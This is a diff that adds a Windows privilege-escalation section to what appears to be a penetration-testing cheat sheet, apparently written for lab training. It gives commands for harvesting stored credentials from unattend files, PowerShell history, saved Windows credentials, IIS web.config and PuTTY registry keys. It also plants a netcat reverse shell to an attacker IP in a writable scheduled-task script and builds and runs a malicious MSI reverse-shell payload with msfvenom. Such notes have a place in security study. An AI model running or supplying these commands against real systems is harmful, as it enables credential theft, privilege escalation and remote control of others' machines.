@@ -3795,3 +3795,79 @@ chmod +s nfs
 ```
 
 At this point, the script can be seen on the shared folder (i.e. no need to transfer). 
+
+## Windows Privilege Escalation
+### Passwords from Usual Spots
+Having the credentials is the easiest way to gain access to a user. At times, these credentials can be left lying around carelessly (i.e. in plaintext, stored by browser/email clients).
+
+Here are some notable places to look:
++ Unattended Windows Installations - using Windows Deployment Services (i.e. use of single OS image for multiple hosts) can lead to administrator accounts to be stored in the following locations.
+    + C:\Unattend.xml
+    + C:\Windows\Panther\Unattend.xml
+    + C:\Windows\Panther\Unattend\Unattend.xml
+    + C:\Windows\system32\sysprep.inf
+    + C:\Windows\system32\sysprep\sysprep.xm
+```
+# Administrator account credentials
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
+</Credentials>
+```
++ Powershell History - command history gets stored in a file and may include passwords.
+```
+# Retrieve using cmd.exe
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+# Retrieve using Powershell
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
++ Saved Windows Credentials - Windows allows the use of other users' credentials
+```
+# List saved credentials
+cmdkey /list
+
+# Run credentials with /savecred
+runas /savecred /user:admin cmd.exe
+```
++ IIS Configuration - web.config file can store passwords for databases or authenticated mechanisms in these locations.
+    + C:\inetpub\wwwroot\web.config
+    + C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+# Quick find database connection strings on the file
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
++ PuTTY - stores proxy configurations that include cleartext authentication credentials
+```
+# Search stored credentials using ProxyPassword
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+### Other Potentially Useful Spots
+Note: the misconfigurations below are less useful in real pentest engagements, but is worth noting.
+
++ Scheduled Tasks - scheduled tasks can have lost or modifiable binaries
+```
+# E.g. Retrieve detailed information about 'vulntask' service
+schtasks /query /tn vulntask /fo list /v
+
+# If current can modify the executable, insert payload
+icacls c:\tasks\schtask.bat
+
+echo c:\tools\nc64.exe -e cmd.exe [ATTACKER_IP] 4444 > C:\tasks\schtask.bat
+
+# Wait for scheduled task to run for exploit to be executed
+```
++ AlwaysInstallElevated - .msi files can be configured to run with higher privileges
+```
+# Set registry values
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+# Generate malicious .msi file using msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+# Run installer to receive reverse shell
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
